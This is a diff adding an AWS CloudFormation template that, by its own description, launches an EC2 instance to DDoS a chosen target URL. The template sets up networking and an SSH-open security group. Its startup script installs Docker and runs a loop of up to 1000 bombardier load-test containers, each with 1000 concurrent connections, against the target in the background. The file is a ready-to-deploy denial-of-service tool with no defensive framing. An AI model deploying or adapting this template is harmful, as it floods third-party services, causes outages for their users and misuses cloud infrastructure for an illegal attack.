@@ -1,0 +1,108 @@
+﻿Description:  Formation to launch instance that will DDoS desired address
+
+Parameters:
+  TargetName:
+    Description: Full name of target for DDoS like "https://example.ru/"
+    Type: String
+    
+Resources:
+  VPC:
+    Type: AWS::EC2::VPC
+    Properties:
+      CidrBlock: 10.0.0.0/16
+      EnableDnsSupport: true
+      EnableDnsHostnames: true
+      Tags:
+        - Key: Name
+          Value: BombVpc
+
+  InternetGateway:
+    Type: AWS::EC2::InternetGateway
+    Properties:
+      Tags:
+        - Key: Name
+          Value: BombGateaway
+
+  InternetGatewayAttachment:
+    Type: AWS::EC2::VPCGatewayAttachment
+    Properties:
+      InternetGatewayId: !Ref InternetGateway
+      VpcId: !Ref VPC
+
+  PublicSubnet:
+    Type: AWS::EC2::Subnet
+    Properties:
+      VpcId: !Ref VPC
+      AvailabilityZone: !Select [ 0, !GetAZs '' ]
+      CidrBlock: 10.0.1.0/24
+      MapPublicIpOnLaunch: true
+      Tags:
+        - Key: Name
+          Value: BombSubnet
+          
+  PublicRouteTable:
+    Type: AWS::EC2::RouteTable
+    Properties:
+      VpcId: !Ref VPC
+      Tags:
+        - Key: Name
+          Value: BombRoutes
+
+  DefaultPublicRoute:
+    Type: AWS::EC2::Route
+    DependsOn: InternetGatewayAttachment
+    Properties:
+      RouteTableId: !Ref PublicRouteTable
+      DestinationCidrBlock: 0.0.0.0/0
+      GatewayId: !Ref InternetGateway
+
+  PublicSubnetRouteTableAssociation:
+    Type: AWS::EC2::SubnetRouteTableAssociation
+    Properties:
+      RouteTableId: !Ref PublicRouteTable
+      SubnetId: !Ref PublicSubnet
+      
+  BombSG:
+    Type: AWS::EC2::SecurityGroup
+    Properties:
+      GroupDescription: allow connections from internet      
+      VpcId: !Ref VPC
+      SecurityGroupIngress:
+      - IpProtocol: tcp
+        FromPort: 22
+        ToPort: 22
+        CidrIp: 0.0.0.0/0        
+          
+          
+  BombardFirst:
+    Type: AWS::EC2::Instance
+    Properties:
+      InstanceType: t2.micro
+      ImageId: ami-04505e74c0741db8d
+      SecurityGroupIds:
+        - !GetAtt BombSG.GroupId        
+      SubnetId: !Ref PublicSubnet
+      Tags: 
+        - Key: Name
+          Value: BomberFirst
+      UserData: 
+        Fn::Base64:
+          !Sub |
+            #!/bin/sh
+            apt-get update -y
+            apt-get install ca-certificates curl gnupg lsb-release -y
+            #apt-get install curl -y
+            #apt-get install gnupg -y
+            #apt-get install lsb-release -y
+            curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg
+            echo "deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
+            apt-get update
+            apt-get install docker-ce docker-ce-cli containerd.io -y
+            echo "for i in {1..1000}; do sudo docker run -d alpine/bombardier -c 1000 -d 60s -l ${TargetName} && sleep 5; done" > /home/ubuntu/script.sh
+            chmod +x /home/ubuntu/script.sh
+            sudo nohup bash /home/ubuntu/script.sh &
+            
+Outputs:
+  TargetName:
+    Description: TargetName
+    Value: !Ref TargetName	
